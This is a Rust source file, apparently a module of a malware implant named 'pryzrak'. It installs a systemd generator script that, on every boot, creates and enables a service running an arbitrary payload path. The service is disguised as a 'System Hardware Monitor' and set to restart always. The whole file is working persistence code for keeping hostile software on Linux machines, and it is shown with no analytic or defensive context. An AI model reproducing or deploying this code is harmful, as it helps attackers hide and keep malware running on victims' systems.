use std::fs::{self, File};
use std::io::Write;
use std::os::unix::fs::PermissionsExt;
use log::info;

#[cfg(target_os = "linux")]
pub struct SystemdGenerator;

#[cfg(target_os = "linux")]
impl SystemdGenerator {
    fn find_generator_dir() -> Option<&'static str> {
        let paths = [
            "/lib/systemd/system-generators",
            "/usr/lib/systemd/system-generators",
            "/etc/systemd/system-generators",
        ];
        paths.iter().find(|p| std::fs::metadata(*p).is_ok()).copied()
    }

    pub fn install(payload_path: &str) -> Result<(), String> {
        let gen_dir = Self::find_generator_dir()
            .ok_or("No systemd generator directory found")?;
        let gen_path = format!("{}/pryzrak-gen", gen_dir);

        let script = format!(r#"#!/bin/sh
TARGET_DIR="$1"
cat <<EOF > "$TARGET_DIR/pryzrak.service"
[Unit]
Description=System Hardware Monitor
After=network.target
[Service]
ExecStart={}
Restart=always
Type=simple
[Install]
WantedBy=multi-user.target
EOF
mkdir -p "$TARGET_DIR/multi-user.target.wants"
ln -sf "$TARGET_DIR/pryzrak.service" "$TARGET_DIR/multi-user.target.wants/"
"#, payload_path);

        let mut file = File::create(&gen_path).map_err(|e| e.to_string())?;
        file.write_all(script.as_bytes()).map_err(|e| e.to_string())?;
        
        let mut perms = fs::metadata(&gen_path).map_err(|e| e.to_string())?.permissions();
        perms.set_mode(0o755);
        fs::set_permissions(&gen_path, perms).map_err(|e| e.to_string())?;

        info!("[Persist] generator installed");
        Ok(())
    }
}
